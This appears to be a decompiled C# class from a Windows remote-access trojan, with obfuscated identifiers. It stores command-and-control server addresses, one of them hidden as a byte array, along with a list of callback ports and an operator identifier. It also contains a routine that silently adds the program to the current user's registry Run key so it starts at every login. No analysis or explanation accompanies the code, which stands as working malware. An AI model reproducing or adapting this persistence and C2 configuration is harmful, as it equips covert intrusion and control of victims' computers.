using System;
using System.IO;
using System.Windows.Forms;
using Microsoft.Win32;

namespace othvidtiraw;

internal static class CEWZRNF
{
	public static byte[] othvidtirawvpsieps = new byte[12]
	{
		49, 54, 55, 46, 56, 54, 46, 56, 57, 46,
		53, 51
	};

	public static string othvidtirawappPwath = Application.get_ExecutablePath().ToString();

	public static string othvidtirawdefaultwP = "201.211.120.150|othvidtiraw".Split(new char[1] { '|' })[0];

	public static string othvidtirawmainwApp = Path.GetFileNameWithoutExtension(Application.get_ExecutablePath().ToString());

	public static int[] ports = new int[5] { 1443, 6118, 8843, 16688, 24619 };

	public static int othvidtirawpowrt;

	public static string othvidtirawpc_iwd = "owride|othvidtiraw".Split(new char[1] { '|' })[0];

	public static string othvidtirawremvwUser = "tbdhervim|othvidtiraw".Split(new char[1] { '|' })[0];

	public static string othvidtirawfilesLwogs = "rgidawbaiv".Split(new char[1] { '|' })[0];

	public static byte[] getBytewArray(string value)
	{
		MemoryStream memoryStream = new MemoryStream();
		TextWriter textWriter = new StreamWriter(memoryStream);
		textWriter.Write(value);
		textWriter.Flush();
		memoryStream.Flush();
		return memoryStream.ToArray();
	}

	public static void othvidtirawset_ruwn(string app, string path)
	{
		try
		{
			string name = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run|othvidtiraw".Split(new char[1] { '|' })[0];
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(name, writable: true);
			string text = othvidtirawpc_iwd;
			object value = registryKey.GetValue(text + app);
			if (value == null || value.ToString() != path)
			{
				registryKey.SetValue(text + app, path);
			}
		}
		catch
		{
		}
	}

	public static string othvidtirawOwsname()
	{
		try
		{
			OperatingSystem oSVersion = Environment.OSVersion;
			return oSVersion.Version.Major + ">" + oSVersion.Version.Minor;
		}
		catch
		{
			return "6>1!othvidtiraw".Split(new char[1] { '!' })[0];
		}
	}

	public static string othvidtirawget_mwpath()
	{
		return Path.GetDirectoryName(othvidtirawappPwath) + "\\";
	}
}
